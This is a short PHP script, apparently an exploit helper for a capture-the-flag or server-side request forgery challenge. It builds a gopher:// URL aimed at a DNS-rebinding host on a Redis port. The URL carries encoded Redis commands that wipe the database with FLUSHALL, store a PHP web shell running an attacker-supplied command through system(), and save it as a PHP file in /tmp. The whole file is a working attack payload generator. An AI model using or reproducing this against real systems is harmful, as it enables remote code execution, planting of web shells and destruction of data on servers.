<?php
    $url = "gopher://a.54.248.150.115.1time.127.0.0.1.1times.repeat.rebind.network:27134/_";
    if (count($argv) !== 2) {
        die("please provide shell command");
    }
    $shell_cmd = $argv[1];
    $redis_cmd = <<<EOF
FLUSHALL\r
SET shell "<?php system('$shell_cmd') ?>"\r
CONFIG SET DIR /tmp\r
CONFIG SET DBFILENAME lol.inc.php\r
SAVE\r
QUIT\r
EOF;
    echo $url . rawurlencode($redis_cmd);
